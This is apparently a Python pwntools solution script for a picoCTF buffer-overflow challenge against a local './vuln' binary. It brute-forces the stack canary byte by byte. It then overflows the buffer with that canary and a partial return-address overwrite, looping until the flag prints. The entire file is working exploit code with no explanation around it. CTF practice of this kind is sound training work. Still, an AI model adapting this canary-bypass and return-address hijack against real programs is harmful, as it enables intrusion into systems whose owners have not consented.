from pwn import *

canary = ""
for j in range(4):
    for i in range(33,127):
        sh = process("./vuln")
        payload = "A"*32 +canary+ chr(i)
        sh.sendline(str(len(payload)))
        sh.sendline(payload)
        answer = sh.recv()
        if("Ok" in answer):
            canary += chr(i)
            break

flag = p16(0x000007ed)
payload = "A"*32 + canary + "A"*16 + flag
while(True):
    sh = process("./vuln")
    sh.sendline(str(len(payload)))
    sh.sendline(payload)
    answer = sh.recvall()
    if("pico" in answer):
        print answer
        break
